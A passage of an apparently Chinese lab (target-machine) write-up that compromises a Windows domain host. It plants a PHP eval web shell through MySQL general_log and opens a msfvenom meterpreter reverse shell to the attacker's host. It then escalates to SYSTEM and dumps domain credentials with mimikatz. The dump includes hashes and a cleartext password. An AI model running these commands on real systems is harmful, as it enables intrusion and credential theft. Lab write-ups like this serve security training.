<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> variables </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%general%&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Variable_name  </span><span class="token keyword" style="color:#00009f">Value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">general_log  </span><span class="token keyword" style="color:#00009f">OFF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">general_log_file  C:\phpStudy\MySQL\</span><span class="token keyword" style="color:#00009f">data</span><span class="token plain">\stu1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> general_log</span><span class="token operator" style="color:#393A34">=</span><span class="token keyword" style="color:#00009f">ON</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Variable_name  </span><span class="token keyword" style="color:#00009f">Value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">general_log  </span><span class="token keyword" style="color:#00009f">OFF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">general_log_file  C:\phpStudy\MySQL\</span><span class="token keyword" style="color:#00009f">data</span><span class="token plain">\stu1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">log</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">set</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> general_log_file</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">None</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;])?&gt;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">None</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>尝试使用蚁剑进行连接</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240304-190426-c6fa5cfaaf9d9426da9613933a41d2d9.png" width="1542" height="1040" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="投放-c2">投放 c2<a href="#投放-c2" class="hash-link" aria-label="投放 c2的直接链接" title="投放 c2的直接链接">​</a></h2>
<p>生成载荷</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.200.129 LPORT=9999 -f exe &gt; aaa.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[-] No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: 510 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of exe file: 7168 bytes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将载荷上传到靶机，并建立监听</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ msfconsole -q</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 &gt; use exploit/multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Using configured payload generic/shell_reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set LHOST 192.168.200.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LHOST =&gt; 192.168.200.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set LPORT 9999</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LPORT =&gt; 9999</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf6 exploit(multi/handler) &gt; exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Started reverse TCP handler on 192.168.200.129:9999</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Sending stage (201798 bytes) to 192.168.200.128</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Meterpreter session 7 opened (192.168.200.129:9999 -&gt; 192.168.200.128:2261) at 2024-03-12 19:33:43 +0800</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>处理一下中文乱码</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;chcp 65001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">chcp 65001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Active code page: 65001</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="网络信息搜集">网络信息搜集<a href="#网络信息搜集" class="hash-link" aria-label="网络信息搜集的直接链接" title="网络信息搜集的直接链接">​</a></h2>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; ipconfig</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface  1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Software Loopback Interface 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 4294967295</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.0.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : ::1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 11</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Intel(R) PRO/1000 MT Network Connection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:0c:29:a7:c1:a8</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 192.168.52.143</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::fcff:cf71:1487:9c27</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 12</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Microsoft ISATAP Adapter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1280</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::5efe:c0a8:348f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 14</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Bluetooth Adapter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 4c:49:6c:2e:05:b2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 169.254.255.214</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.255.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::b1fb:3116:3b18:ffd6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 15</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Microsoft ISATAP Adapter #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1280</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 16</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Microsoft ISATAP Adapter #3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1280</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::5efe:a9fe:81ba</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 17</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Microsoft ISATAP Adapter #4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1280</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Microsoft ISATAP Adapter #5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1280</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::5efe:c0a8:c880</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 19</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Microsoft ISATAP Adapter #6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:00:00:00:00:00</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1280</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 22</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : TAP-Windows Adapter V9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:ff:44:8d:cb:b5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 169.254.135.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.255.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::480f:c25c:1f43:8781</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 23</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : TAP-Windows Adapter V9 #2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:ff:56:0b:ea:fc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 169.254.99.189</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.255.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::4d82:616f:441c:63bd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Npcap Loopback Adapter</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 02:00:4c:4f:4f:50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 169.254.129.186</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.255.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::b461:ccad:e30f:81ba</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Interface 26</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Name         : Intel(R) PRO/1000 MT Network Connection #3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hardware MAC : 00:0c:29:a7:c1:b2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">MTU          : 1500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Address : 192.168.200.128</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv4 Netmask : 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Address : fe80::b021:42bf:e3dc:3942</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>找到内网网段 <code>192.168.52.0/24</code></p>
<p>尝试直接借助 Metasploit 直接提权</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; getuid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server username: GOD\Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; getsystem</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; getuid</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Server username: NT AUTHORITY\SYSTEM</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="域信息搜集">域信息搜集<a href="#域信息搜集" class="hash-link" aria-label="域信息搜集的直接链接" title="域信息搜集的直接链接">​</a></h2>
<p>既然已经得到了 <code>NT AUTHORITY\SYSTEM</code> 用户权限的话，那么就可以尝试获取域的信息</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">获取域的凭据信息</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; load kiwi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Loading extension kiwi...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .#####.   mimikatz 2.2.0 20191125 (x64/windows)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;## v ##&#x27;        Vincent LE TOUX            (vincent.letoux@gmail.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27;#####&#x27;         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Success.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">meterpreter &gt; creds_all</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[+] Running as SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[*] Retrieving all credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msv credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">===============</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain  LM                                NTLM                              SHA1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------  --                                ----                              ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  GOD     edea194d76c77d87d5f7fffc086227d3  81be2f80d568100549beac645d6a7141  216d52c4efa68532a98c8cbe2b492634d175fa84</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">STU1$          GOD                                       a2aae427277fafb0655d0a015d93b31d  3cb6a0c7488fdaeaa0e54e5e50a2cea4d2aed0bf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wdigest credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">===================</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Username       Domain  Password</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--------       ------  --------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(null)         (null)  (null)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Administrator  GOD     hongrisec@2020</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">STU1$          GOD     55 bb da 11 1c 19 32 70 d5 18 4c a2 19 e7 0d f4 01 b8 fe 7f 75 68 52 f9 7d d9 37 03 87 73 99 bf 8f e7 9f bf 45 00 60 28 69 72 9a 8d 59 f3 f6 01 f8 9b 99 58 fd 58 5b e8 e2 46 b1 5b 34</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                       a1 69 bf aa 31 f5 77 d5 78 51 db 45 db f6 c8 9a f0 8e 21 b8 0c 4b 86 b4 ec 11 17 98 e0 4f a9 65 7a 26 bf a8 3a f9 d2 6e af 30 65 e0 68 b1 08 9d 4d 4f 01 47 7d 96 cc 74 97 47 8b 05 a6</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                       a4 c6 8c 27 14 7c c4 19 51 9a 2d d6 4b b8 1a 0d 28 05 0c ab 53 16 98 4a 2a bb cd 7e 12 3f b6 a8 fb f6 9d 3d 5a 8b af af 00 66 14 65 ca 85 04 9a 80 8b 13 f5 8f 7a 8c 22 91 ed b2 b7 a4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                       b2 a9 21 59 8a e2 9f 23 a7 1b c8 ef d2 c6 ba 80 e8 1f e5 41 04 40 31 9e eb 0a 21 f0 1f 4c 11 aa bd 25 51 64 7b c7 a4 e5 47 08 94 42 46 90 43 06 17 35 5c 0b b4 c4 cc e4 0e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tspkg credentials</span><br></span><span class="token-line" style="color:#393A34"><span class="token 